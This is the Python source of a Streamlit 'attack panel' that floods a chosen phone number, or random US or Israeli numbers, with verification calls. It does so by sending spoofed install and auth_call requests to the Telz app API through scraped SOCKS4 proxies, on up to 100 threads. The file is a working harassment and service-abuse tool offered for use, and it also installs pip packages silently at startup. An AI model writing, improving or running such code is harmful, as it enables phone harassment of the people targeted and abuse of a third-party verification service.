import streamlit as st
import subprocess
import sys
import random
import time
import uuid
import string
import json
import webbrowser
import os
from concurrent.futures import ThreadPoolExecutor

# --- إعدادات الواجهة (English) ---
st.set_page_config(page_title="DOOMSDAY ATTACK - GX3", page_icon="💀")

st.markdown("""
    <style>
    .main { background-color: #000000; color: #ff0000; font-family: 'Courier New', Courier, monospace; }
    .stButton>button { width: 100%; background-color: #660000; color: white; border: 2px solid #ff0000; }
    .doom-box { border: 2px solid #ff0000; padding: 20px; border-radius: 10px; background-color: #0a0000; text-align: center; }
    </style>
    """, unsafe_allow_html=True)

# --- تفعيل المكتبات تلقائياً (بدون حذف حرف) ---
def install_libs():
    libs = ['requests', 'termcolor', 'pyfiglet']
    for lib in libs:
        try:
            __import__(lib)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

install_libs()
import requests

# --- الدوال الأصلية (كما هي تماماً) ---
def generate_unique_ids():
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def fetch_internal_proxies():
    proxies = []
    try:
        res = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all", timeout=10)
        if res.status_code == 200:
            for line in res.text.splitlines():
                if line.strip(): proxies.append(f"socks4://{line.strip()}")
    except: pass
    return proxies

def load_proxies(filename="gx1gx1.txt"):
    proxies = []
    if os.path.exists(filename):
        with open(filename, "r") as f:
            proxies.extend([l.strip() for l in f.read().splitlines() if l.strip()])
    proxies.extend(fetch_internal_proxies())
    return list(set(proxies))

def get_random_proxy(proxies):
    if not proxies: return None
    p = random.choice(proxies)
    return {"http": p, "https": p}

def send_install_request(url, headers, payload, proxy=None):
    try:
        r = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
        return r.ok and "ok" in r.text
    except: return False

def send_auth_call_request(url, headers, payload, proxy=None):
    try:
        r = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
        return r.ok and "ok" in r.text
    except: return False

# --- واجهة المستخدم ---
st.markdown('<div class="doom-box">', unsafe_allow_html=True)
st.image("https://files.catbox.moe/3cq9i1.jpg") # شعار القناة
st.title("G X 3 - ATTACK PANEL")
st.write("Channel: @gx3gx3 | Dev: @PDD6P")
st.markdown('</div>', unsafe_allow_html=True)

# حالة العدادات
if 'ok' not in st.session_state: st.session_state.ok = 0
if 'err' not in st.session_state: st.session_state.err = 0
if 'running' not in st.session_state: st.session_state.running = False

# الإعدادات
mode = st.selectbox("Select Target Mode:", ["Manual Entry", "USA Random 🇺🇸", "Israel Random 🇮🇱"])
if mode == "Manual Entry":
    c_code = st.text_input("Country Code (e.g. 964):", "964")
    number = st.text_input("Phone Number:")
elif mode == "USA Random 🇺🇸":
    c_code, number = "1", "RANDOM"
else:
    c_code, number = "972", "RANDOM"

threads = st.slider("Attack Power (Threads):", 1, 100, 20)

# محرك الهجوم
def attack_logic(country_code, target_num):
    proxies = load_proxies()
    headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}
    langs = ["en", "fr", "de", "tr", "es", "ar", "he", "ru"]
    
    while st.session_state.running:
        current_num = target_num if target_num != "RANDOM" else "".join(random.choices(string.digits, k=9))
        ts, fox, u_uuid = generate_unique_ids()
        proxy = get_random_proxy(proxies)
        
        payload = json.dumps({"android_id": fox, "app_version": "17.5.17", "event": "install", "ts": ts, "uuid": str(u_uuid)})
        
        if send_install_request("https://api.telz.com/app/install", headers, payload, proxy):
            auth_payload = json.dumps({"android_id": fox, "phone": f"+{country_code}{current_num}", "ts": ts, "uuid": str(u_uuid), "event": "auth_call", "lang": random.choice(langs)})
            if send_auth_call_request("https://api.telz.com/app/auth_call", headers, auth_payload, proxy):
                st.session_state.ok += 1
            else: st.session_state.ok += 0 # Failed call
        st.session_state.err += 1 # Any attempt counts
        time.sleep(0.01)

# أزرار التحكم
col1, col2 = st.columns(2)
with col1:
    if st.button("🔥 START ATTACK"):
        st.session_state.running = True
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads): executor.submit(attack_logic, c_code, number)
with col2:
    if st.button("🛑 STOP"):
        st.session_state.running = False
        st.rerun()

# العدادات الحية
st.subheader(f"✅ Success: {st.session_state.ok} | ❌ Total Attempts: {st.session_state.err}")
